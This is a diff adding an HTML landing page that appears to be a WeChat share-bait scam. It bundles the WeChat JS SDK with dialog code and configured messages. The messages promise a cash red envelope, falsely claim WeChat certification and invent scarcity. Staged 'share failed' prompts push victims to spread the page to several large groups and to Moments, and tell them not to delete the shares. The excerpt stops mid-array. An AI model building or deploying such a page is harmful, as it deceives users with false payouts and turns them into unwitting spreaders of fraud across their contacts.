@@ -1,0 +1,1942 @@
+<html lang="en">
+
+<head>
+    <title>加载中...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="maximum-scale=1.0, minimum-scale=1.0, user-scalable=0, initial-scale=1.0, width=device-width">
+    <meta name="format-detection" content="telephone=no, email=no, date=no, address=no">
+    <!-- <meta name="referrer" content="unsafe-url"> -->
+    <meta name="referrer" content="always">
+
+    <style>
+        html,body{background-color:#ededed}*{padding:0;margin:0}.page{font-family:Helvetica Neue,Helvetica,Arial,sans-serif}@keyframes show1{0%{opacity:0;transform:scale(0.2)}100%{opacity:1;transform:scale(1)}}@keyframes btn1{0%{transform:rotate(-720deg)}100%{transform:rotate(0deg)}}@keyframes show2{0%{opacity:0;transform:translateY(50%)}100%{opacity:1;transform:translateY(0%)}}@keyframes btn2{0%{transform:scale(0)}100%{transform:scale(1)}}@keyframes show3{0%{opacity:0;transform:translateY(-50%)}100%{opacity:1;transform:translateY(0%)}}@keyframes btn3{0%{transform:scale(0)}100%{transform:scale(1)}}@keyframes show4{0%{opacity:0;border-radius:100%}100%{opacity:1;border-radius:0}}@keyframes btn4{0%{transform:scale(1,0)}100%{transform:scale(1,1)}}@keyframes btnShake1{0%{transform:scale(1)}40%{transform:scale(1.1)}60%{transform:scale(.9)}80%{transform:scale(1.2)}100%{transform:scale(1)}}@keyframes btnShake2{0%{transform:scale(1)}40%{transform:scale(1.1,0.9)}60%{transform:scale(.9,1.1)}80%{transform:scale(1.2,0.8)}100%{transform:scale(1)}}@keyframes btnShake3{0%{transform:scale(1,1) rotate(0deg)}10%{transform:scale(1.2,0.8)}20%{transform:scale(0.8,1.2)}30%{transform:scale(1.2,0.8)}40%{transform:scale(0.8,1.2)}50%{transform:scale(1,1)}60%{transform:rotate(-15deg)}70%{transform:rotate(15deg)}80%{transform:rotate(-25deg)}90%{transform:rotate(25deg)}100%{transform:scale(1,1) rotate(0deg)}}@keyframes btnShake4{0%{transform:rotate(0deg);opacity:1}10%{transform:scale(1.2,0.8)}20%{transform:scale(0.8,1.2)}30%{transform:scale(1.2,0.8)}40%{transform:scale(0.8,1.2)}50%{transform:scale(1,1)}60%{opacity:1}70%{opacity:.5}80%{opacity:1}90%{opacity:.5}100%{transform:scale(1,1);opacity:1}}@keyframes btnMove{from{transform:rotateY(180deg)}to{transform:rotateY(360deg)}}@keyframes itemMove1{0%{height:0}100%{height:60px}}@keyframes itemMove2{0%{height:0;transform:scaleY(0)}40%{height:60px;transform:scaleY(0)}100%{transform:scaleY(1)}}@keyframes itemMove3{0%{height:0;transform:translateX(100px);opacity:0}40%{height:60px;transform:translateX(100px);opacity:0}100%{transform:translateX(0px);opacity:1}}@keyframes itemMove4{0%{height:0;transform:translateX(-100px);opacity:0}40%{height:60px;transform:translateX(-100px);opacity:0}100%{transform:translateX(0px);opacity:1}}@keyframes tipMove{0%{transform:translate(0px,0%)}40%{transform:translate(-10px,30%)}100%{transform:translate(0px,0%)}}.text-tip{position:relative}.text-tip::before{position:absolute;content:"";width:.1px;height:.1px;border:solid 8px rgba(0,0,0,0);border-right-color:#ebcd9b;top:0;left:-16px}a{text-decoration:none}@keyframes zyshake{0%,100%{-webkit-transform:translateX(0)}10%,30%,50%,70%,90%{-webkit-transform:translateX(-5px)}20%,40%,60%,80%{-webkit-transform:translateX(5px)}}.zy{animation:zyshake 1s}.tan-bg-tz{background-color:#fff;border-radius:6px;position:fixed;width:96%;animation:demo2 5s ease-in-out 0s 1 alternate forwards;left:2%;z-index:66666}.tongzhi_top{display:flex;justify-content:space-between;margin-bottom:4px}.tongzhi_bottom{display:flex;align-items:center;justify-content:space-between;font-size:14px}.t_l_text{display:flex;align-items:center;font-size:12px}.t_l_text img{width:20px;height:auto;display:block;margin-right:10px}.safe-img{margin-top:4px}.safe-img img{width:14px;height:auto;display:block}.tz_img img{width:10vw;height:10vw;display:block}.text-ling{margin-top:4px;color:#6a6a6a}.text-new{color:#6a6a6a}.new-bg-tz{padding:10px 10px 12px 20px}@keyframes demo2{0%{transform:translateY(-100px)}20%{transform:translateY(4px)}60%{transform:translateY(4px)}100%{transform:translateY(-300px)}}
+    </style>
+
+    <script src="./jquery.min-1.js?id=w1222242121211221111112223221111112211"></script>
+</head>
+
+<body>
+    <script>
+        (function () {
+            window['M'] = window['M'] || {};
+            // 加载js文件
+            M.loadJS = function (src, callback, errCallback) {
+                if (!src) {
+                    return;
+                }
+                var e = document.createElement('script');
+                e.setAttribute('type', 'text/javascript');
+                e.setAttribute('charset', 'utf-8');
+                e.setAttribute('src', src);
+                document.documentElement.appendChild(e);
+                if (typeof errCallback === 'function') {
+                    e.onerror = errCallback;
+                }
+                e.onload = function () {
+                    if (typeof callback === 'function') {
+                        callback();
+                    }
+                };
+            };
+
+            // 上报统计
+            M.report = function (id) {
+                if (!id) {
+                    return false;
+                }
+                window['_hmt'] = window['_hmt'] || [];
+                var hm = document.createElement('script');
+                hm.src = 'https://hm.baidu.com/hm.js?' + id;
+                var s = document.getElementsByTagName('script')[0];
+                s.parentNode.insertBefore(hm, s);
+            };
+
+            M.getParam = function (name, url) {
+                var r = new RegExp('(\\?|#|&)' + name + '=(.*?)(#|&|$)');
+                var m = (url || location.href).match(r);
+                return (m ? m[2] : '');
+            };
+
+            M.resetFont = function () {
+                function setFont() {
+                    var clientWidth = document.documentElement.clientWidth;
+                    document.documentElement.style.fontSize = parseFloat(clientWidth / 3.75) + 'px';
+                };
+                window.addEventListener('orientationchange' in window ? 'orientationchange' : 'resize', setFont,
+                    false);
+                document.addEventListener('DOMContentLoaded', setFont, false);
+                setTimeout(setFont, 100)
+            };
+        })();
+
+
+        (function () {
+            String.prototype.jstpl_format = function (ns) {
+                function fn(w, g) {
+                    if (g in ns) {
+                        return ns[g];
+                    } else {
+                        return '';
+                    }
+                };
+                return this.replace(/%\(([A-Za-z0-9_|.]+)\)/g, fn);
+            };
+
+            var config = {
+                tpl: {
+                    _alerttpl: [
+                        '<div id="js_mod_dialog" class="mod-popup %(popupClass)">',
+                        '  <div class="popup-body">',
+                        '    <h3 class="popup-title">%(title)</h3>',
+                        '    <div class="popup-cont">%(message)</div>',
+                        '    <div class="popup-btn">%(btnhtml)</div>',
+                        '  </div>',
+                        '</div>',
+                    ].join('')
+                }
+            };
+
+            var hasInsetCSS = false;
+            var g_js_dialogCb = null;
+            var g_js_cancel_dialogCb = null;
+
+            window.g_js_dialog = function (type) {
+                close();
+                if (typeof g_js_dialogCb === 'function') {
+                    g_js_dialogCb(type);
+                }
+            };
+            window.g_js_cancel_dialog = function (type) {
+                close();
+                if (typeof g_js_cancel_dialogCb === 'function') {
+                    g_js_cancel_dialogCb(type);
+                }
+            };
+
+            function __insetCss() {
+                hasInsetCSS = true;
+                var text =
+                    '.mod-popup{z-index:10000;width:100%;position:fixed;top:0;left:0;height:100%;background:rgba(0,0,0,.5)}.popup-body{position:absolute;width:3rem;margin-top:1.55rem;border-radius:6px;background:#fff;left:50%;margin-left:-1.5rem}.popup-body .popup-title{color:#000;font-size:.2rem;margin-top:.2rem;text-align:center}.popup-body .popup-cont{padding:.12rem .24rem .2rem;font-size:.16rem;color:rgba(0,0,0,.54);text-align:center}.popup-body .popup-btn{width:100%;border-top:1px solid rgba(0,0,0,.08);font-size:0}.double-btn-popup .popup-btn a{display:inline-block;width:50%;color:#009688;font-weight:700;text-align:center;font-size:.18rem;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:.16rem 0}.double-btn-popup .popup-btn a+a{border-left:1px solid rgba(0,0,0,.08)}.single-btn-popup a{display:block;width:100%;color:#009688;font-weight:700;text-align:center;font-size:.18rem;padding:.16rem 0}';
+                var s = document.createElement('style');
+                s.innerHTML = text;
+                document.head.appendChild(s);
+                s = null;
+            };
+
+            function close() {
+                var d = document.getElementById('js_mod_dialog');
+                if (d) {
+                    document.body.removeChild(d);
+                    d = null;
+                }
+            };
+
+            function alert(p) {
+
+                if (!hasInsetCSS) {
+                    __insetCss();
+                }
+                close();
+                g_js_dialogCb = null;
+
+                var opt = {
+                    title: '温馨提示',
+                    message: '',
+                    btn: '知道了',
+                    cb: null
+                };
+
+                if (typeof p === 'string') {
+                    opt.message = p;
+                } else if (typeof p === 'object') {
+                    opt = $.extend(opt, p);
+                } else {
+                    opt.message = typeof p;
+                    if (opt.message === 'boolean') {
+                        if (p) {
+                            opt.message = 'true';
+                        } else {
+                            opt.message = 'false';
+                        }
+                    }
+                }
+
+                opt.btnhtml = '<a class="js_global_dialog_submit_btn" href="javascript:;" data-value="0"><span>' + (
+                    opt.btn) + '</span></a>';
+
+                opt.popupClass = makePopupType(opt);
+                var html = config.tpl._alerttpl.jstpl_format(opt);
+                g_js_dialogCb = opt.cb;
+                setTimeout(function () {
+                    document.body.insertAdjacentHTML("beforeEnd", html);
+                }, 200);
+            };
+
+            function makePopupType(opt) {
+                var type = 'single-btn-popup';
+                if (opt && opt.btn && typeof opt.btn !== 'string' && opt.btn.length > 1 && typeof opt.btn.push ===
+                    'function') {
+                    type = 'double-btn-popup';
+                }
+                return type;
+            }
+
+            function confirm(p) {
+
+                if (!hasInsetCSS) {
+                    __insetCss();
+                }
+                close();
+                g_js_dialogCb = null;
+                g_js_cancel_dialogCb = null;
+                var opt = {
+                    title: '温馨提示',
+                    message: '',
+                    btn: ['取消', '确定'],
+                    cb: null,
+                    cancelCb: null,
+                    href: ''
+                };
+
+                if (typeof p === 'string') {
+                    opt.message = p;
+                } else if (typeof p === 'object') {
+                    opt = $.extend(opt, p);
+                } else {
+                    return;
+                }
+
+                opt.btnhtml = '<a class="js_global_dialog_cancel_btn" href="javascript:;"><span>' + opt.btn[0] +
+                    '</span></a>';
+                opt.btnhtml += '<a class="' + (opt.href ? '' : 'js_global_dialog_submit_btn') + '" href="' + (opt
+                        .href ? opt.href : 'javascript:;') + '" data-value="1"><span>' + (opt.btn[1]) +
+                    '</span></a>';
+
+                opt.popupClass = makePopupType(opt);
+                var html = config.tpl._alerttpl.jstpl_format(opt);
+                g_js_dialogCb = opt.cb;
+                g_js_cancel_dialogCb = opt.cancelCb;
+
+                setTimeout(function () {
+                    document.body.insertAdjacentHTML("beforeEnd", html);
+                }, 200);
+            };
+
+            window.g_dialog = {
+                close: close,
+                alert: alert,
+                confirm: confirm,
+            };
+
+            $(function () {
+                document.body.onclick = function () {}
+                $(document.body).on('click', '.js_global_dialog_cancel_btn', function (event) {
+                    event.preventDefault();
+                    g_js_cancel_dialog(0);
+                    return false;
+                });
+
+                $(document.body).on('click', '.js_global_dialog_submit_btn', function (event) {
+                    event.preventDefault();
+                    var $this = $(this);
+                    var value = parseInt($this.attr('data-value'));
+                    g_js_dialog(value);
+                    return false;
+                });
+            });
+        })();
+      function getQueryVariable(variable)
+{
+       var query = window.location.search.substring(1);
+       var vars = query.split("&");
+       for (var i=0;i<vars.length;i++) {
+               var pair = vars[i].split("=");
+               if(pair[0] == variable){return pair[1];}
+       }
+       return(false);
+}
+var wxa=atob(getQueryVariable('wx').replace('wx',""));
+var ts = Math.round(new Date().getTime()/1000).toString();
+
+var sjjsdk=parseInt((ts - wxa));
+var fz=sjjsdk % 3600;
+var fzf=Math.floor(fz / 60);
+
+var zf=sjjsdk % 60;
+
+function cooke(){
+
+if(fzf=='0' && zf<'10'){
+// alert(1)
+// }else{
+//     alert(2)
+ }
+}
+cooke();
+!function(e, n) {
+    "function" == typeof define && (define.amd || define.cmd) ? define(function() {
+        return n(e)
+    }) : n(e, !0)
+} (this,
+function(e, n) {
+    function i(n, i, t) {
+        e.WeixinJSBridge ? WeixinJSBridge.invoke(n, o(i),
+        function(e) {
+            c(n, e, t)
+        }) : d(n, t)
+    }
+    function t(n, i, t) {
+        e.WeixinJSBridge ? WeixinJSBridge.on(n,
+        function(e) {
+            t && t.trigger && t.trigger(e),
+            c(n, e, i)
+        }) : t ? d(n, t) : d(n, i)
+    }
+    function o(e) {
+        return e = e || {},
+        e.appId = L.appId,
+        e.verifyAppId = L.appId,
+        e.verifySignType = "sha1",
+        e.verifyTimestamp = L.timestamp + "",
+        e.verifyNonceStr = L.nonceStr,
+        e.verifySignature = L.signature,
+        e
+    }
+    function r(e) {
+        return {
+            timeStamp: e.timestamp + "",
+            nonceStr: e.nonceStr,
+            package: e.package,
+            paySign: e.paySign,
+            signType: e.signType || "SHA1"
+        }
+    }
+    function c(e, n, i) {
+        delete n.err_code,
+        delete n.err_desc,
+        delete n.err_detail;
+        var t = n.errMsg;
+        t || (t = n.err_msg, delete n.err_msg, t = a(e, t), n.errMsg = t),
+        (i = i || {})._complete && (i._complete(n), delete i._complete),
+        t = n.errMsg || "",
+        L.debug && !i.isInnerInvoke && alert(JSON.stringify(n));
+        var o = t.indexOf(":");
+        switch (t.substring(o + 1)) {
+        case "ok":
+            i.success && i.success(n);
+            break;
+        case "cancel":
+            i.cancel && i.cancel(n);
+            break;
+        default:
+            i.fail && i.fail(n)
+        }
+        i.complete && i.complete(n)
+    }
+    function a(e, n) {
+        var i = e,
+        t = g[i];
+        t && (i = t);
+        var o = "ok";
+        if (n) {
+            var r = n.indexOf(":");
+            "confirm" == (o = n.substring(r + 1)) && (o = "ok"),
+            "failed" == o && (o = "fail"),
+            -1 != o.indexOf("failed_") && (o = o.substring(7)),
+            -1 != o.indexOf("fail_") && (o = o.substring(5)),
+            "access denied" != (o = (o = o.replace(/_/g, " ")).toLowerCase()) && "no permission to execute" != o || (o = "permission denied"),
+            "config" == i && "function not exist" == o && (o = "ok"),
+            "" == o && (o = "fail")
+        }
+        return n = i + ":" + o
+    }
+    function s(e) {
+        if (e) {
+            for (var n = 0,
+            i = e.length; n < i; ++n) {
+                var t = e[n],
+                o = m[t];
+                o && (e[n] = o)
+            }
+            return e
+        }
+    }
+    function d(e, n) {
+        if (! (!L.debug || n && n.isInnerInvoke)) {
+            var i = g[e];
+            i && (e = i),
+            n && n._complete && delete n._complete,
+            console.log('"' + e + '",', n || "")
+        }
+    }
+    function l(e) {
+        0 != A.preVerifyState && (v || w || L.debug || M < "6.0.2" || A.systemType < 0 || V || (V = !0, A.appId = L.appId, A.initTime = b.initEndTime - b.initStartTime, A.preVerifyTime = b.preVerifyEndTime - b.preVerifyStartTime, C.getNetworkType({
+            isInnerInvoke: !0,
+            success: function(e) {
+                A.networkType = e.networkType;
+                var n = "http://open.weixin.qq.com/sdk/report?v=" + A.version + "&o=" + A.preVerifyState + "&s=" + A.systemType + "&c=" + A.clientVersion + "&a=" + A.appId + "&n=" + A.networkType + "&i=" + A.initTime + "&p=" + A.preVerifyTime + "&u=" + A.url; (new Image).src = n
+            }
+        })))
+    }
+    function u() {
+        return (new Date).getTime()
+    }
+    function p(n) {
+        I && (e.WeixinJSBridge ? n() : h.addEventListener && h.addEventListener("WeixinJSBridgeReady", n, !1))
+    }
+    function f() {
+        C.invoke || (C.invoke = function(n, i, t) {
+            e.WeixinJSBridge && WeixinJSBridge.invoke(n, o(i), t)
+        },
+        C.on = function(n, i) {
+            e.WeixinJSBridge && WeixinJSBridge.on(n, i)
+        })
+    }
+    if (!e.jWeixin) {
+        var m = {
+            config: "preVerifyJSAPI",
+            onMenuShareTimeline: "menu:share:timeline",
+            onMenuShareAppMessage: "menu:share:appmessage",
+            onMenuShareQQ: "menu:share:qq",
+            onMenuShareWeibo: "menu:share:weiboApp",
+            onMenuShareQZone: "menu:share:QZone",
+            previewImage: "imagePreview",
+            getLocation: "geoLocation",
+            openProductSpecificView: "openProductViewWithPid",
+            addCard: "batchAddCard",
+            openCard: "batchViewCard",
+            chooseWXPay: "getBrandWCPayRequest"
+        },
+        g = function() {
+            var e = {};
+            for (var n in m) e[m[n]] = n;
+            return e
+        } (),
+        h = e.document,
+        y = h.title,
+        S = navigator.userAgent.toLowerCase(),
+        _ = navigator.platform.toLowerCase(),
+        v = !(!_.match("mac") && !_.match("win")),
+        w = -1 != S.indexOf("wxdebugger"),
+        I = -1 != S.indexOf("micromessenger"),
+        T = -1 != S.indexOf("android"),
+        k = -1 != S.indexOf("iphone") || -1 != S.indexOf("ipad"),
+        M = function() {
+            var e = S.match(/micromessenger\/(\d+\.\d+\.\d+)/) || S.match(/micromessenger\/(\d+\.\d+)/);
+            return e ? e[1] : ""
+        } (),
+        V = !1,
+        x = !1,
+        b = {
+            initStartTime: u(),
+            initEndTime: 0,
+            preVerifyStartTime: 0,
+            preVerifyEndTime: 0
+        },
+        A = {
+            version: 1,
+            appId: "",
+            initTime: 0,
+            preVerifyTime: 0,
+            networkType: "",
+            preVerifyState: 1,
+            systemType: k ? 1 : T ? 2 : -1,
+            clientVersion: M,
+            url: encodeURIComponent(location.href)
+        },
+        L = {},
+        P = {
+            _completes: []
+        },
+        W = {
+            state: 0,
+            data: {}
+        };
+        p(function() {
+            b.initEndTime = u()
+        });
+       
+
+      
+        var C = {
+            config: function(e) {
+                L = e,
+                d("config", e);
+                var n = !1 !== L.check;
+                p(function() {
+                    if (n) i(m.config, {
+                        verifyJsApiList: s(L.jsApiList)
+                    },
+                    function() {
+                        P._complete = function(e) {
+                            b.preVerifyEndTime = u(),
+                            W.state = 1,
+                            W.data = e
+                        },
+                        P.success = function(e) {
+                            A.preVerifyState = 0
+                        },
+                        P.fail = function(e) {
+                            P._fail ? P._fail(e) : W.state = -1
+                        };
+                        var e = P._completes;
+                        return e.push(function() {
+                            l()
+                        }),
+                        P.complete = function(n) {
+                            for (var i = 0,
+                            t = e.length; i < t; ++i) e[i]();
+                            P._completes = []
+                        },
+                        P
+                    } ()),
+                    b.preVerifyStartTime = u();
+                    else {
+                        W.state = 1;
+                        for (var e = P._completes,
+                        t = 0,
+                        o = e.length; t < o; ++t) e[t]();
+                        P._completes = []
+                    }
+                }),
+                L.beta && f()
+            },
+            ready: function(e) {
+           0 != W.state ? e() : (P._completes.push(e), !I && L.debug && e())
+            },
+            error: function(e) {
+                M < "6.0.2" || x || (x = !0, -1 == W.state ? e(W.data) : P._fail = e)
+            },
+            checkJsApi: function(e) {
+                var n = function(e) {
+                    var n = e.checkResult;
+                    for (var i in n) {
+                        var t = g[i];
+                        t && (n[t] = n[i], delete n[i])
+                    }
+                    return e
+                };
+                i("checkJsApi", {
+                    jsApiList: s(e.jsApiList)
+                },
+                (e._complete = function(e) {
+                    if (T) {
+                        var i = e.checkResult;
+                        i && (e.checkResult = JSON.parse(i))
+                    }
+                    e = n(e)
+                },
+                e))
+            },
+            onMenuShareTimeline: function(e) {
+                t(m.onMenuShareTimeline, {
+                    complete: function() {
+                        i("shareTimeline", {
+                            title: e.title || y,
+                            desc: e.title || y,
+                            img_url: e.imgUrl || "",
+                            link: e.link || location.href,
+                            type: e.type || "link",
+                            data_url: e.dataUrl || ""
+                        },
+                        e)
+                    }
+                },
+                e)
+            },
+            onMenuShareAppMessage: function(e) {
+                t(m.onMenuShareAppMessage, {
+                    complete: function(n) {
+                        "favorite" === n.scene ? i("sendAppMessage", {
+                            title: e.title || y,
+                            desc: e.desc || "",
+                            link: e.link || location.href,
+                            img_url: e.imgUrl || "",
+                            type: e.type || "link",
+                            data_url: e.dataUrl || ""
+                        }) : i("sendAppMessage", {
+                            title: e.title || y,
+                            desc: e.desc || "",
+                            link: e.link || location.href,
+                            img_url: e.imgUrl || "",
+                            type: e.type || "link",
+                            data_url: e.dataUrl || ""
+                        },
+                        e)
+                    }
+                },
+                e)
+            },
+            onMenuShareQQ: function(e) {
+                t(m.onMenuShareQQ, {
+                    complete: function() {
+                        i("shareQQ", {
+                            title: e.title || y,
+                            desc: e.desc || "",
+                            img_url: e.imgUrl || "",
+                            link: e.link || location.href
+                        },
+                        e)
+                    }
+                },
+                e)
+            },
+            onMenuShareWeibo: function(e) {
+                t(m.onMenuShareWeibo, {
+                    complete: function() {
+                        i("shareWeiboApp", {
+                            title: e.title || y,
+                            desc: e.desc || "",
+                            img_url: e.imgUrl || "",
+                            link: e.link || location.href
+                        },
+                        e)
+                    }
+                },
+                e)
+            },
+            onMenuShareQZone: function(e) {
+                t(m.onMenuShareQZone, {
+                    complete: function() {
+                        i("shareQZone", {
+                            title: e.title || y,
+                            desc: e.desc || "",
+                            img_url: e.imgUrl || "",
+                            link: e.link || location.href
+                        },
+                        e)
+                    }
+                },
+                e)
+            },
+            startRecord: function(e) {
+                i("startRecord", {},
+                e)
+            },
+            stopRecord: function(e) {
+                i("stopRecord", {},
+                e)
+            },
+            onVoiceRecordEnd: function(e) {
+                t("onVoiceRecordEnd", e)
+            },
+            playVoice: function(e) {
+                i("playVoice", {
+                    localId: e.localId
+                },
+                e)
+            },
+            pauseVoice: function(e) {
+                i("pauseVoice", {
+                    localId: e.localId
+                },
+                e)
+            },
+            stopVoice: function(e) {
+                i("stopVoice", {
+                    localId: e.localId
+                },
+                e)
+            },
+            onVoicePlayEnd: function(e) {
+                t("onVoicePlayEnd", e)
+            },
+            uploadVoice: function(e) {
+                i("uploadVoice", {
+                    localId: e.localId,
+                    isShowProgressTips: 0 == e.isShowProgressTips ? 0 : 1
+                },
+                e)
+            },
+            downloadVoice: function(e) {
+                i("downloadVoice", {
+                    serverId: e.serverId,
+                    isShowProgressTips: 0 == e.isShowProgressTips ? 0 : 1
+                },
+                e)
+            },
+            translateVoice: function(e) {
+                i("translateVoice", {
+                    localId: e.localId,
+                    isShowProgressTips: 0 == e.isShowProgressTips ? 0 : 1
+                },
+                e)
+            },
+            chooseImage: function(e) {
+                i("chooseImage", {
+                    scene: "1|2",
+                    count: e.count || 9,
+                    sizeType: e.sizeType || ["original", "compressed"],
+                    sourceType: e.sourceType || ["album", "camera"]
+                },
+                (e._complete = function(e) {
+                    if (T) {
+                        var n = e.localIds;
+                        try {
+                            n && (e.localIds = JSON.parse(n))
+                        } catch(e) {}
+                    }
+                },
+                e))
+            },
+            previewImage: function(e) {
+                i(m.previewImage, {
+                    current: e.current,
+                    urls: e.urls
+                },
+                e)
+            },
+            uploadImage: function(e) {
+                i("uploadImage", {
+                    localId: e.localId,
+                    isShowProgressTips: 0 == e.isShowProgressTips ? 0 : 1
+                },
+                e)
+            },
+            downloadImage: function(e) {
+                i("downloadImage", {
+                    serverId: e.serverId,
+                    isShowProgressTips: 0 == e.isShowProgressTips ? 0 : 1
+                },
+                e)
+            },
+            getNetworkType: function(e) {
+                var n = function(e) {
+                    var n = e.errMsg;
+                    e.errMsg = "getNetworkType:ok";
+                    var i = e.subtype;
+                    if (delete e.subtype, i) e.networkType = i;
+                    else {
+                        var t = n.indexOf(":"),
+                        o = n.substring(t + 1);
+                        switch (o) {
+                        case "wifi":
+                        case "edge":
+                        case "wwan":
+                            e.networkType = o;
+                            break;
+                        default:
+                            e.errMsg = "getNetworkType:fail"
+                        }
+                    }
+                    return e
+                };
+                i("getNetworkType", {},
+                (e._complete = function(e) {
+                    e = n(e)
+                },
+                e))
+            },
+            openLocation: function(e) {
+                i("openLocation", {
+                    latitude: e.latitude,
+                    longitude: e.longitude,
+                    name: e.name || "",
+                    address: e.address || "",
+                    scale: e.scale || 28,
+                    infoUrl: e.infoUrl || ""
+                },
+                e)
+            },
+            getLocation: function(e) {
+                e = e || {},
+                i(m.getLocation, {
+                    type: e.type || "wgs84"
+                },
+                (e._complete = function(e) {
+                    delete e.type
+                },
+                e))
+            },
+            hideOptionMenu: function(e) {
+                i("hideOptionMenu", {},
+                e)
+            },
+            showOptionMenu: function(e) {
+                i("showOptionMenu", {},
+                e)
+            },
+            closeWindow: function(e) {
+                i("closeWindow", {},
+                e = e || {})
+            },
+            hideMenuItems: function(e) {
+                i("hideMenuItems", {
+                    menuList: e.menuList
+                },
+                e)
+            },
+            showMenuItems: function(e) {
+                i("showMenuItems", {
+                    menuList: e.menuList
+                },
+                e)
+            },
+            hideAllNonBaseMenuItem: function(e) {
+                i("hideAllNonBaseMenuItem", {},
+                e)
+            },
+            showAllNonBaseMenuItem: function(e) {
+                i("showAllNonBaseMenuItem", {},
+                e)
+            },
+            scanQRCode: function(e) {
+                i("scanQRCode", {
+                    needResult: (e = e || {}).needResult || 0,
+                    scanType: e.scanType || ["qrCode", "barCode"]
+                },
+                (e._complete = function(e) {
+                    if (k) {
+                        var n = e.resultStr;
+                        if (n) {
+                            var i = JSON.parse(n);
+                            e.resultStr = i && i.scan_code && i.scan_code.scan_result
+                        }
+                    }
+                },
+                e))
+            },
+            openProductSpecificView: function(e) {
+                i(m.openProductSpecificView, {
+                    pid: e.productId,
+                    view_type: e.viewType || 0,
+                    ext_info: e.extInfo
+                },
+                e)
+            },
+            addCard: function(e) {
+                for (var n = e.cardList,
+                t = [], o = 0, r = n.length; o < r; ++o) {
+                    var c = n[o],
+                    a = {
+                        card_id: c.cardId,
+                        card_ext: c.cardExt
+                    };
+                    t.push(a)
+                }
+                i(m.addCard, {
+                    card_list: t
+                },
+                (e._complete = function(e) {
+                    var n = e.card_list;
+                    if (n) {
+                        for (var i = 0,
+                        t = (n = JSON.parse(n)).length; i < t; ++i) {
+                            var o = n[i];
+                            o.cardId = o.card_id,
+                            o.cardExt = o.card_ext,
+                            o.isSuccess = !!o.is_succ,
+                            delete o.card_id,
+                            delete o.card_ext,
+                            delete o.is_succ
+                        }
+                        e.cardList = n,
+                        delete e.card_list
+                    }
+                },
+                e))
+            },
+            chooseCard: function(e) {
+                i("chooseCard", {
+                    app_id: L.appId,
+                    location_id: e.shopId || "",
+                    sign_type: e.signType || "SHA1",
+                    card_id: e.cardId || "",
+                    card_type: e.cardType || "",
+                    card_sign: e.cardSign,
+                    time_stamp: e.timestamp + "",
+                    nonce_str: e.nonceStr
+                },
+                (e._complete = function(e) {
+                    e.cardList = e.choose_card_info,
+                    delete e.choose_card_info
+                },
+                e))
+            },
+            openCard: function(e) {
+                for (var n = e.cardList,
+                t = [], o = 0, r = n.length; o < r; ++o) {
+                    var c = n[o],
+                    a = {
+                        card_id: c.cardId,
+                        code: c.code
+                    };
+                    t.push(a)
+                }
+                i(m.openCard, {
+                    card_list: t
+                },
+                e)
+            },
+            chooseWXPay: function(e) {
+                i(m.chooseWXPay, r(e), e)
+            }
+        };
+        return n && (e.wx = e.jWeixin = C),
+        C
+    }
+});
+    </script>
+    <script>
+        var left = ((2110 + (100 - new Date().getMinutes())) / 10).toFixed(1);
+        var shareATimes = M.getParam('_shareatimes') ? parseInt(M.getParam('_shareatimes')) : 0;
+        var shareTTimes = M.getParam('_sharettimes') ? parseInt(M.getParam('_sharettimes')) : 0;
+        var shareAtLimit = 3;
+
+        function extend() {
+            window.gConfig = $.extend({
+                endPageUrl: 'javascript:WeixinJSBridge.call("closeWindow");',
+                defaultTips: [
+                    '<span style="font-size: 23px;color:#bda475;">恭喜您抢到现金补贴</span><br/>',
+                    '<span style="font-size: 25px;color:red;">%(money)元</span><br/>',
+                    '<span style="color:red;">活动宗旨：</span><span style="color:black;">' + content.zz +
+                    '</span><br/>',
+                    '<span style="color:red;">提现方法：</span><span style="color:black;">' + content.yq +
+                    '</span><br/><br>',
+                    '<span style="color:red;font-size: 18px;">完成后自动存入您的微信钱包</span><br><br>',
+                    '<span>红包总额仅剩余' + left + '万元，先到先得（以提现成功为准），活动经微信官方认证，真实有效</span><br/>',
+                ].join(''),
+                successTips: [
+                    '<b style="font-size: 22px;color: red;">恭喜您</b><br>',
+                    '获得￥ <span style="font-size: 20px;color: red;">%(money)</span> 现金红包，',
+                    '金额已提交银行打款，活动过于火爆，预计2-3小时内到账，请注意查收微信绑定银行卡到账情况！<br><span style="font-size: 20px;color:red;">注意:打款期间分享信息不可删除，否则无法核实用户信息，以免现金红包发放失败！</span>',
+                ].join(''),
+                groupTips: [{
+                        successTitle: '<b style="font-size: 22px;color: #bda475;">分享成功</b>',
+                        successTips: '请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>',
+                    },
+                    {
+                        successTitle: '<b style="font-size: 22px;color: #bda475;">分享成功</b>',
+                        successTips: '请继续分享到<b style="font-size: 18px;color: red">1</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>',
+                    },
+                    {
+                        successTitle: '<b style="font-size: 22px;color: red;">分享失败</b>',
+                        successTips: '注意：<span color="red">分享到相同的群会失败</span><br>请尝试重新分享到<b style="font-size: 18px;color: red">1个不同的群</b><br>',
+                    },
+                    {
+                        successTitle: '<b style="font-size: 22px;color: red;">分享失败</b>',
+                        successTips: '请分享到<b style="color: red;">人数大于50人</b>的微信群，即可获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰！',
+                    },
+                    /*
+					{
+                        successTitle: '<b style="font-size: 22px;color: red;">分享失败</b>',
+                        successTips: '<b style="color: red;">因网络延迟，获取人数太多，重新分享1个群，即可获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰！',
+                    },
+                    */
+                    {
+                        successTitle: '<b style="font-size: 22px;color: #bda475;">分享成功</b>',
+                        successTips: '剩下最后一步啦！<br />请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>，<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰立即到账！',
+                    },
+                ],
+                timeLineTips: [{
+                    successTitle: '<b style="font-size: 22px;color: red;">分享失败</b>',
+                    successTips: '注意：必须[<span color="red">公开</span>]分享哦!<br>请尝试重新分享到<b style="font-size: 18px;color: red">朋友圈</b><br>',
+                }]
+            }, (window['data']));
+        }
+
+        function showShareTips(obj) {
+            if (typeof obj === 'object') {
+                g_dialog.alert({
+                    title: obj.successTitle || '',
+                    message: obj.successTips,
+                    btn: '我知道了'
+                });
+            } else if (typeof obj === 'string' && obj) {
+                g_dialog.alert({
+                    title: '',
+                    message: obj,
+                    btn: '我知道了'
+                });
+            }
+        }
+
+        function querySelector(e) {
+            return document.querySelector(e)
+        }
+        var user = [{
+            name: "孙笑川",
